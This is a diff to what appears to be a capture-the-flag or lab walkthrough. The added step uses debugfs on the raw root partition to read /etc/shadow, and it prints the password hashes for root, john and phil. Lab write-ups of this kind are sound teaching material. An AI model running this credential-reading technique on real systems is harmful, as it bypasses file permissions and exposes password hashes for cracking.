@@ -612,4 +612,17 @@ tmpfs           193M   96K  193M   1% /run/user/120
 tmpfs           193M   84K  193M   1% /run/user/1001
 ```
 
-Then ill see where the root filesystem is mounted, in this case it is `/dev/`
+Then ill see where the root filesystem is mounted, in this case it is `/dev/nvme0n1p2` 
+
+```python
+john@web-01:~$ debugfs -R "cat /etc/shadow" /dev/nvme0n1p2                   
+debugfs 1.47.0 (5-Feb-2023)
+root:$y$j9T$uRHoEU5C3ZnE6Kt6Sz/NW1$8m3MtiaS4dFlfT/2t6RYKa18S54WXM5.CenjwiQhtF6:20501:0:99999:7:::
+
+...[SNIP]...
+
+john:$y$j9T$lX/l.Yv7LH4cST6t15deg1$t9fSpc2xmG3UBtnHUpZDfG.QUr1ucZ2ak1SLzMl3/jC:20501:0:99999:7:::
+phil:$y$j9T$i2LFuy7cs2HePwULiFRMJ/$YzG0GUcPaP01bzjW3vWbb4pMkMmsEkPTx04DLeitby0:20501:0:99999:7:::
+```
+
+And now i can access any file on the system using this
